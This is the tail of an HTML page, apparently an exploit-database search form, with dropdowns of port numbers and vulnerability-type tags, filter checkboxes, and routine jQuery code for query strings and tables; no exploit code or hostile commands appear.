                                    <option value="532" >
                                        532
                                    </option>


                                
                                    <option value="548" >
                                        548
                                    </option>


                                
                                    <option value="554" >
                                        554
                                    </option>


                                
                                    <option value="555" >
                                        555
                                    </option>


                                
                                    <option value="617" >
                                        617
                                    </option>


                                
                                    <option value="623" >
                                        623
                                    </option>


                                
                                    <option value="631" >
                                        631
                                    </option>


                                
                                    <option value="655" >
                                        655
                                    </option>


                                
                                    <option value="689" >
                                        689
                                    </option>


                                
                                    <option value="783" >
                                        783
                                    </option>


                                
                                    <option value="787" >
                                        787
                                    </option>


                                
                                    <option value="808" >
                                        808
                                    </option>


                                
                                    <option value="873" >
                                        873
                                    </option>


                                
                                    <option value="888" >
                                        888
                                    </option>


                                
                                    <option value="901" >
                                        901
                                    </option>


                                
                                    <option value="998" >
                                        998
                                    </option>


                                
                                    <option value="1000" >
                                        1000
                                    </option>


                                
                                    <option value="1040" >
                                        1040
                                    </option>


                                
                                    <option value="1089" >
                                        1089
                                    </option>


                                
                                    <option value="1099" >
                                        1099
                                    </option>


                                
                                    <option value="1100" >
                                        1100
                                    </option>


                                
                                    <option value="1114" >
                                        1114
                                    </option>


                                
                                    <option value="1120" >
                                        1120
                                    </option>


                                
                                    <option value="1194" >
                                        1194
                                    </option>


                                
                                    <option value="1235" >
                                        1235
                                    </option>


                                
                                    <option value="1471" >
                                        1471
                                    </option>


                                
                                    <option value="1521" >
                                        1521
                                    </option>


                                
                                    <option value="1533" >
                                        1533
                                    </option>


                                
                                    <option value="1581" >
                                        1581
                                    </option>


                                
                                    <option value="1589" >
                                        1589
                                    </option>


                                
                                    <option value="1604" >
                                        1604
                                    </option>


                                
                                    <option value="1617" >
                                        1617
                                    </option>


                                
                                    <option value="1723" >
                                        1723
                                    </option>


                                
                                    <option value="1743" >
                                        1743
                                    </option>


                                
                                    <option value="1761" >
                                        1761
                                    </option>


                                
                                    <option value="1812" >
                                        1812
                                    </option>


                                
                                    <option value="1858" >
                                        1858
                                    </option>


                                
                                    <option value="1861" >
                                        1861
                                    </option>


                                
                                    <option value="1900" >
                                        1900
                                    </option>


                                
                                    <option value="1947" >
                                        1947
                                    </option>


                                
                                    <option value="2000" >
                                        2000
                                    </option>


                                
                                    <option value="2022" >
                                        2022
                                    </option>


                                
                                    <option value="2049" >
                                        2049
                                    </option>


                                
                                    <option value="2100" >
                                        2100
                                    </option>


                                
                                    <option value="2103" >
                                        2103
                                    </option>


                                
                                    <option value="2121" >
                                        2121
                                    </option>


                                
                                    <option value="2125" >
                                        2125
                                    </option>


                                
                                    <option value="2181" >
                                        2181
                                    </option>


                                
                                    <option value="2242" >
                                        2242
                                    </option>


                                
                                    <option value="2315" >
                                        2315
                                    </option>


                                
                                    <option value="2375" >
                                        2375
                                    </option>


                                
                                    <option value="2380" >
                                        2380
                                    </option>


                                
                                    <option value="2381" >
                                        2381
                                    </option>


                                
                                    <option value="2401" >
                                        2401
                                    </option>


                                
                                    <option value="2480" >
                                        2480
                                    </option>


                                
                                    <option value="2525" >
                                        2525
                                    </option>


                                
                                    <option value="2640" >
                                        2640
                                    </option>


                                
                                    <option value="2810" >
                                        2810
                                    </option>


                                
                                    <option value="2812" >
                                        2812
                                    </option>


                                
                                    <option value="2947" >
                                        2947
                                    </option>


                                
                                    <option value="2954" >
                                        2954
                                    </option>


                                
                                    <option value="2990" >
                                        2990
                                    </option>


                                
                                    <option value="3000" >
                                        3000
                                    </option>


                                
                                    <option value="3030" >
                                        3030
                                    </option>


                                
                                    <option value="3050" >
                                        3050
                                    </option>


                                
                                    <option value="3052" >
                                        3052
                                    </option>


                                
                                    <option value="3128" >
                                        3128
                                    </option>


                                
                                    <option value="3129" >
                                        3129
                                    </option>


                                
                                    <option value="3181" >
                                        3181
                                    </option>


                                
                                    <option value="3200" >
                                        3200
                                    </option>


                                
                                    <option value="3217" >
                                        3217
                                    </option>


                                
                                    <option value="3306" >
                                        3306
                                    </option>


                                
                                    <option value="3333" >
                                        3333
                                    </option>


                                
                                    <option value="3378" >
                                        3378
                                    </option>


                                
                                    <option value="3389" >
                                        3389
                                    </option>


                                
                                    <option value="3460" >
                                        3460
                                    </option>


                                
                                    <option value="3465" >
                                        3465
                                    </option>


                                
                                    <option value="3500" >
                                        3500
                                    </option>


                                
                                    <option value="3535" >
                                        3535
                                    </option>


                                
                                    <option value="3632" >
                                        3632
                                    </option>


                                
                                    <option value="3690" >
                                        3690
                                    </option>


                                
                                    <option value="3790" >
                                        3790
                                    </option>


                                
                                    <option value="3814" >
                                        3814
                                    </option>


                                
                                    <option value="3817" >
                                        3817
                                    </option>


                                
                                    <option value="4000" >
                                        4000
                                    </option>


                                
                                    <option value="4002" >
                                        4002
                                    </option>


                                
                                    <option value="4070" >
                                        4070
                                    </option>


                                
                                    <option value="4081" >
                                        4081
                                    </option>


                                
                                    <option value="4105" >
                                        4105
                                    </option>


                                
                                    <option value="4111" >
                                        4111
                                    </option>


                                
                                    <option value="4322" >
                                        4322
                                    </option>


                                
                                    <option value="4343" >
                                        4343
                                    </option>


                                
                                    <option value="4434" >
                                        4434
                                    </option>


                                
                                    <option value="4444" >
                                        4444
                                    </option>


                                
                                    <option value="4501" >
                                        4501
                                    </option>


                                
                                    <option value="4555" >
                                        4555
                                    </option>


                                
                                    <option value="4592" >
                                        4592
                                    </option>


                                
                                    <option value="4661" >
                                        4661
                                    </option>


                                
                                    <option value="4750" >
                                        4750
                                    </option>


                                
                                    <option value="4848" >
                                        4848
                                    </option>


                                
                                    <option value="5000" >
                                        5000
                                    </option>


                                
                                    <option value="5060" >
                                        5060
                                    </option>


                                
                                    <option value="5061" >
                                        5061
                                    </option>


                                
                                    <option value="5080" >
                                        5080
                                    </option>


                                
                                    <option value="5081" >
                                        5081
                                    </option>


                                
                                    <option value="5093" >
                                        5093
                                    </option>


                                
                                    <option value="5151" >
                                        5151
                                    </option>


                                
                                    <option value="5180" >
                                        5180
                                    </option>


                                
                                    <option value="5247" >
                                        5247
                                    </option>


                                
                                    <option value="5250" >
                                        5250
                                    </option>


                                
                                    <option value="5272" >
                                        5272
                                    </option>


                                
                                    <option value="5308" >
                                        5308
                                    </option>


                                
                                    <option value="5432" >
                                        5432
                                    </option>


                                
                                    <option value="5466" >
                                        5466
                                    </option>


                                
                                    <option value="5554" >
                                        5554
                                    </option>


                                
                                    <option value="5555" >
                                        5555
                                    </option>


                                
                                    <option value="5600" >
                                        5600
                                    </option>


                                
                                    <option value="5655" >
                                        5655
                                    </option>


                                
                                    <option value="5666" >
                                        5666
                                    </option>


                                
                                    <option value="5800" >
                                        5800
                                    </option>


                                
                                    <option value="5803" >
                                        5803
                                    </option>


                                
                                    <option value="5814" >
                                        5814
                                    </option>


                                
                                    <option value="5858" >
                                        5858
                                    </option>


                                
                                    <option value="5900" >
                                        5900
                                    </option>


                                
                                    <option value="5984" >
                                        5984
                                    </option>


                                
                                    <option value="6066" >
                                        6066
                                    </option>


                                
                                    <option value="6070" >
                                        6070
                                    </option>


                                
                                    <option value="6080" >
                                        6080
                                    </option>


                                
                                    <option value="6082" >
                                        6082
                                    </option>


                                
                                    <option value="6101" >
                                        6101
                                    </option>


                                
                                    <option value="6112" >
                                        6112
                                    </option>


                                
                                    <option value="6129" >
                                        6129
                                    </option>


                                
                                    <option value="6379" >
                                        6379
                                    </option>


                                
                                    <option value="6502" >
                                        6502
                                    </option>


                                
                                    <option value="6503" >
                                        6503
                                    </option>


                                
                                    <option value="6660" >
                                        6660
                                    </option>


                                
                                    <option value="6667" >
                                        6667
                                    </option>


                                
                                    <option value="7001" >
                                        7001
                                    </option>


                                
                                    <option value="7002" >
                                        7002
                                    </option>


                                
                                    <option value="7070" >
                                        7070
                                    </option>


                                
                                    <option value="7071" >
                                        7071
                                    </option>


                                
                                    <option value="7080" >
                                        7080
                                    </option>


                                
                                    <option value="7100" >
                                        7100
                                    </option>


                                
                                    <option value="7144" >
                                        7144
                                    </option>


                                
                                    <option value="7210" >
                                        7210
                                    </option>


                                
                                    <option value="7272" >
                                        7272
                                    </option>


                                
                                    <option value="7290" >
                                        7290
                                    </option>


                                
                                    <option value="7426" >
                                        7426
                                    </option>


                                
                                    <option value="7443" >
                                        7443
                                    </option>


                                
                                    <option value="7510" >
                                        7510
                                    </option>


                                
                                    <option value="7547" >
                                        7547
                                    </option>


                                
                                    <option value="7649" >
                                        7649
                                    </option>


                                
                                    <option value="7770" >
                                        7770
                                    </option>


                                
                                    <option value="7777" >
                                        7777
                                    </option>


                                
                                    <option value="7778" >
                                        7778
                                    </option>


                                
                                    <option value="7787" >
                                        7787
                                    </option>


                                
                                    <option value="7879" >
                                        7879
                                    </option>


                                
                                    <option value="7902" >
                                        7902
                                    </option>


                                
                                    <option value="8000" >
                                        8000
                                    </option>


                                
                                    <option value="8001" >
                                        8001
                                    </option>


                                
                                    <option value="8002" >
                                        8002
                                    </option>


                                
                                    <option value="8004" >
                                        8004
                                    </option>


                                
                                    <option value="8008" >
                                        8008
                                    </option>


                                
                                    <option value="8020" >
                                        8020
                                    </option>


                                
                                    <option value="8022" >
                                        8022
                                    </option>


                                
                                    <option value="8023" >
                                        8023
                                    </option>


                                
                                    <option value="8028" >
                                        8028
                                    </option>


                                
                                    <option value="8030" >
                                        8030
                                    </option>


                                
                                    <option value="8080" >
                                        8080
                                    </option>


                                
                                    <option value="8081" >
                                        8081
                                    </option>


                                
                                    <option value="8082" >
                                        8082
                                    </option>


                                
                                    <option value="8088" >
                                        8088
                                    </option>


                                
                                    <option value="8090" >
                                        8090
                                    </option>


                                
                                    <option value="8181" >
                                        8181
                                    </option>


                                
                                    <option value="8300" >
                                        8300
                                    </option>


                                
                                    <option value="8400" >
                                        8400
                                    </option>


                                
                                    <option value="8443" >
                                        8443
                                    </option>


                                
                                    <option value="8445" >
                                        8445
                                    </option>


                                
                                    <option value="8473" >
                                        8473
                                    </option>


                                
                                    <option value="8500" >
                                        8500
                                    </option>


                                
                                    <option value="8585" >
                                        8585
                                    </option>


                                
                                    <option value="8619" >
                                        8619
                                    </option>


                                
                                    <option value="8800" >
                                        8800
                                    </option>


                                
                                    <option value="8812" >
                                        8812
                                    </option>


                                
                                    <option value="8839" >
                                        8839
                                    </option>


                                
                                    <option value="8880" >
                                        8880
                                    </option>


                                
                                    <option value="8888" >
                                        8888
                                    </option>


                                
                                    <option value="9000" >
                                        9000
                                    </option>


                                
                                    <option value="9001" >
                                        9001
                                    </option>


                                
                                    <option value="9002" >
                                        9002
                                    </option>


                                
                                    <option value="9080" >
                                        9080
                                    </option>


                                
                                    <option value="9090" >
                                        9090
                                    </option>


                                
                                    <option value="9091" >
                                        9091
                                    </option>


                                
                                    <option value="9100" >
                                        9100
                                    </option>


                                
                                    <option value="9124" >
                                        9124
                                    </option>


                                
                                    <option value="9200" >
                                        9200
                                    </option>


                                
                                    <option value="9251" >
                                        9251
                                    </option>


                                
                                    <option value="9256" >
                                        9256
                                    </option>


                                
                                    <option value="9443" >
                                        9443
                                    </option>


                                
                                    <option value="9447" >
                                        9447
                                    </option>


                                
                                    <option value="9784" >
                                        9784
                                    </option>


                                
                                    <option value="9788" >
                                        9788
                                    </option>


                                
                                    <option value="9855" >
                                        9855
                                    </option>


                                
                                    <option value="9876" >
                                        9876
                                    </option>


                                
                                    <option value="9900" >
                                        9900
                                    </option>


                                
                                    <option value="9987" >
                                        9987
                                    </option>


                                
                                    <option value="9993" >
                                        9993
                                    </option>


                                
                                    <option value="9999" >
                                        9999
                                    </option>


                                
                                    <option value="10000" >
                                        10000
                                    </option>


                                
                                    <option value="10001" >
                                        10001
                                    </option>


                                
                                    <option value="10080" >
                                        10080
                                    </option>


                                
                                    <option value="10202" >
                                        10202
                                    </option>


                                
                                    <option value="10203" >
                                        10203
                                    </option>


                                
                                    <option value="10443" >
                                        10443
                                    </option>


                                
                                    <option value="10616" >
                                        10616
                                    </option>


                                
                                    <option value="11000" >
                                        11000
                                    </option>


                                
                                    <option value="11211" >
                                        11211
                                    </option>


                                
                                    <option value="11460" >
                                        11460
                                    </option>


                                
                                    <option value="12203" >
                                        12203
                                    </option>


                                
                                    <option value="12221" >
                                        12221
                                    </option>


                                
                                    <option value="12345" >
                                        12345
                                    </option>


                                
                                    <option value="12397" >
                                        12397
                                    </option>


                                
                                    <option value="12401" >
                                        12401
                                    </option>


                                
                                    <option value="13327" >
                                        13327
                                    </option>


                                
                                    <option value="13701" >
                                        13701
                                    </option>


                                
                                    <option value="13722" >
                                        13722
                                    </option>


                                
                                    <option value="13838" >
                                        13838
                                    </option>


                                
                                    <option value="16992" >
                                        16992
                                    </option>


                                
                                    <option value="18821" >
                                        18821
                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
